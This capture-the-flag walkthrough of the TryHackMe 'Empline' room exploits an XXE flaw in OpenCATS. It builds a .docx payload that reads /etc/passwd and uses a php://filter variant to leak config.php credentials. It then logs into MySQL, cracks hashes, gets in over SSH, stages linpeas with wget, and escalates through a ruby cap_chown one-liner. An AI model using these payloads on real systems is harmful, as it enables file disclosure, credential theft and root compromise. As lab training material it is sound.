# Empline

“Are you good enough to apply for this job?”

A detailed walkthrough on the room [Empline](https://tryhackme.com/room/empline) on [https://www.tryhackme.com/](https://tryhackme.com).

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled.png)

Difficulty : Medium 

## 1- Scanning And Enumeration

Now first of all we will run a NMAP scan on the target to get some information.

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-15 12:32 IST
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 91.67% done; ETC: 12:32 (0:00:00 remaining)
Nmap scan report for 10.10.249.12
Host is up (0.28s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Empline
|_http-server-header: Apache/2.4.29 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 85
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, DontAllowDatabaseTableColumn, ConnectWithDatabase, Support41Auth, IgnoreSigpipes, InteractiveClient, SupportsTransactions, LongPassword, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, ODBCClient, SupportsCompression, Speaks41ProtocolNew, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Hw?q@*P7_X{&Fo|An(yN
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.34 seconds
```

Here we can see 3 ports, 80 (HTTP), 22 (SSH) and 3306 (mysql).

So here we can assume that the HTTP service is using mysql as their database. Let’s visit the HTTP service now!

But before we visit the website we will have to add the website to `/etc/hosts` with the host name `empline.thm`

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%201.png)

Once that is done we can visit the webpage, on visiting the webpage looks pretty normal with nothing useful. 

Then after hovering over the `Employment` section in the webpage I saw that it redirects us to `job.empline.thm/careers` so I added this to my `/etc/hosts` file too. 

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%202.png)

Now let’s visit the subdomain. 

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%203.png)

And if we click on `current opening positions` it redirects us to a other page with a lots of parameters. 

The parameters : 

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%204.png)

The webpage : 

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%205.png)

And clicking on the `Mobile Dev` also adds a another parameter `ID` to the url.

But once we visit the `Mobile Dev` link we get a option `Apply to Position`

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%206.png)

After clicking here we get a options to apply to the job and we can upload a file here which can be used for malicious reasons. 

So I searched for `opencat exploits` and I came across [this](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/) article.

So in this vulnerability, opencat allows us to upload a `.docx` file and as a docx file is made up of a lots of xml files, the opencat portal executes the `word/document.xml` file present in it.

So first of all we have to make the `.docx` file to do that you can execute this python script.

```python
from docx import Document
document = Document()
paragraph = document.add_paragraph("YOUR NAME")
document.save("script.docx")
```

After running the script you should have your `.docx` file ready.

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%207.png)

Now we have to `unzip` the `.docz` file. And then follow the commands.

```bash
unzip script.docx 
cd word
nano document.xml
```

Now you should see this 

```bash
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:mo="http://schemas.microsoft.com/office/mac/office/2008/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:mv="urn:schemas-microsoft-com:mac:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 wp14"><w:body><w:p><w:r><w:t>&test;</w:t></w:r></w:p><w:sectPr w:rsidR="00FC693F" w:rsidRPr="0006063C" w:rsidSect="00034616"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>
```

First you have to add this line at the 2nd line 

```bash
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:mo="http://schemas.microsoft.com/office/mac/office/2008/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:mv="urn:schemas-microsoft-com:mac:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 wp14"><w:body><w:p><w:r><w:t>YOUR_NAME</w:t></w:r></w:p><w:sectPr w:rsidR="00FC693F" w:rsidRPr="0006063C" w:rsidSect="00034616"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>
```

After that we have to add `&test;` instead of `YOUR_NAME` in the file to execute the `passwd` line.

```bash
<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas" xmlns:mo="http://schemas.microsoft.com/office/mac/office/2008/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:mv="urn:schemas-microsoft-com:mac:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:wpi="http://schemas.microsoft.com/office/word/2010/wordprocessingInk" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" mc:Ignorable="w14 wp14"><w:body><w:p><w:r><w:t>&test;</w:t></w:r></w:p><w:sectPr w:rsidR="00FC693F" w:rsidRPr="0006063C" w:rsidSect="00034616"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>
```

Now you can save this file and then exit this `word` directory and then execute this command. 

```bash
zip resume.docx word/document.xml
```

And now your malicious resume is ready!

## 2- Upload Resume and Config

Now you have to select the resume and then hit upload,  you will see this. 

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%208.png)

Now we have the `/etc/passwd` file of the system! 

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
[REDACTED]:x:1002:1002::/home/george:/bin/bash
```

By looking at this we now know that the system has a user names `george`.

Now lets also get a the config file using the same technique as shows in the above linked articles, to get the config file you have to just change this. 

```bash
<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'>]>
```

And now you can zip the file like we did earlier! 

And now after upload the file you should have this! 

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%209.png)

This string is decoded by base64 so we can decode it and then you will get 

```bash
/* Database configuration. */
define('DATABASE_USER', '[REDACTED]');
define('DATABASE_PASS', '[REDACTED]');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');
```

Now we have the username and the password, so now let’s log into mysql database. 

```bash
mysql -h 10.10.249.12 -u [REDACTED] -p [REDACTED]
```

Once you have the access you have to run these commands. 

```bash
show databases; 
use opencats;
show tables;
select * from user;
```

Now you should have 3 users and 3 passwords.

And you can crack one of the password using [crackstation.net](http://crackstation.net/).

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%2010.png)

Now you can log into SSH with the user and the password and you will get the `user.txt`

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%2012.png)

![naruto-anime.gif](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/naruto-anime.gif)

## 3- Privilege Escalation

Now we have the user file, its time to get the root!

First of all I tried the classic `sudo -l` technique but couldn’t find anything.

![Untitled](Empline%2003dc209133254172aa5afcd3e291e1cd/Untitled%2012.png)

Now after that I checked for SUIDs and found nothing again. Now I transported [linpeas.sh](http://linpeas.sh) to the victim system. 

- Step 1 : Save the file and save it in a file.

```bash
nano linpeas.sh
```

- Step 2 : Set up a python HTTP server.

```bash
python2 -m SimpleHTTPServer 8081
```

- Step 3 : Download the file in the victim system.

```bash
wget http://<ip>:8081/linpeas.sh
```

- Step 4 : Give permissions of file.

```bash
chmod +x linpeas.sh
```

- Step 5 : Run the file!

```bash
./linpeas.sh
```

And after the script finished I found this. 

```bash
Files with capabilities:
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```

Here we can see that ruby is a file with capabilities so I instantly searched for `ruby` on GTFOBins.

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%2013.png)

I couldn’t really understand the GTFOBins command so I started researching on ruby chown and came across this [ruby documentation](https://ruby-doc.org/stdlib-2.4.1/libdoc/fileutils/rdoc/FileUtils.html). 

And according to this page the idea of command should be. 

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%2014.png)

 

The command came out to be.

```ruby
/usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown "george", "george", "/root/"'
```

Now let’s understand the command, so here first of all we execute the command by the `-e` tag. And as the code is supposed to be a one-liner so we are using `;` then a actual new-line.

Then we “import” the fileutils library and then we follow the above idea we got from the documentation so we specify the `user` then the `group` and then the `options` and its done.

![Untitled](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/Untitled%2015.png)

And we did it!!!

![mr-robot-happy.gif](https://github.com/3J0SKA/THM-WriteUps/blob/main/Empline/Images/mr-robot-happy.gif)